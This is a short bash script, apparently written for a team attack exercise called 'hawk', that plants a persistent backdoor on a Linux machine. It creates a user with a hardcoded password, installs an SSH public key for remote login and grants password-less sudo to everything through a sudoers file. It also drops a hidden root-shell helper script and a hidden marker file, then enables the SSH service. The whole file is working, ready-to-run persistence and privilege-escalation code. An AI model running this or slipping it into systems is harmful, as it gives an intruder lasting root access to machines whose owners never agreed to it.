#!/bin/bash
# Squad: hawk
# Purpose: Create APT access and escalation mechanism
# Access Method: SSH authorized key backdoor
# Escalation Method: Sudoers NOPASSWD configuration

# Create squad user with home directory
useradd -m -s /bin/bash hawk 2>/dev/null

# Set a password for the user
echo 'hawk:superSECRETpass' | chpasswd

# Create .ssh directory with proper permissions
mkdir -p /home/hawk/.ssh
chmod 700 /home/hawk/.ssh

# Add premade public key to authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH5CNAu5iaKCcCUm0z2FI8SCPuK2ku9D+LbP+2VPNwQb" > /home/hawk/.ssh/authorized_keys
chmod 600 /home/hawk/.ssh/authorized_keys

# Set ownership
chown -R hawk:hawk /home/hawk/.ssh

# Create escalation method: sudoers entry allowing password-less sudo
# This is very evils >:D
echo "hawk ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/hawk_access
chmod 440 /etc/sudoers.d/hawk_access

# Create a hidden escalation script in user's home
cat > /home/hawk/.escalate << 'EOF'
#!/bin/bash
# Hidden escalation helper
sudo -n /bin/bash
EOF

chmod 700 /home/hawk/.escalate
chown hawk:hawk /home/hawk/.escalate

# Create persistence marker
touch /var/tmp/.hawk_apt_active

# Ensure SSH service is enabled and running
systemctl enable sshd 2>/dev/null
systemctl start sshd 2>/dev/null
